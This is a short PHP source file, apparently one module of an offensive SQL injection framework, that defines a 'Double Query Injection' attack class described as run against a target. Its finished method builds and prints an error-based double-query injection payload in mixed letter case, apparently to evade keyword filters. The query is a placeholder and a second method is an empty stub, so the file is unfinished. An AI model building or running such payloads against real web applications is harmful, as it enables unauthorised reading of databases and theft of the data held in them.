<?php
	 	 
namespace sqlCore;
use \Framework as Framework;

	
class doubleQuery extends Framework {
	
		 
	protected $framework, $name, $description, $sqli;
	
  	public function __construct($framework)
	{
		$this->framework = $framework;
		$this->name = "Double Query Injection";
		$this->description = "Performs Double Query Injection Against the Target";
		$this->base_path = $this->framework->base;
		$this->defaultVariables = array(
		'url' => array('required' => false, 'description' => ' ', 'match' => self::regexURL)
		);
		
	}
	     
	public function ordoubleQuery() {
		$zmark = rand();
		$mark = bin2hex($zmark);
		$mark2 = $zmark;
		$query = "test";
		$base = "oR 1 GrOUp bY cONcAt(".$mark.",".$query.",".$mark.",FlOoR(RaNd(0)*2)) HaVIng MiN(0) oR 1".$this->framework->delim."\n";
		echo $base; 
		 
	}
	
	protected function anddoubleQuery() {
		 
		 
	}
     
}

?>
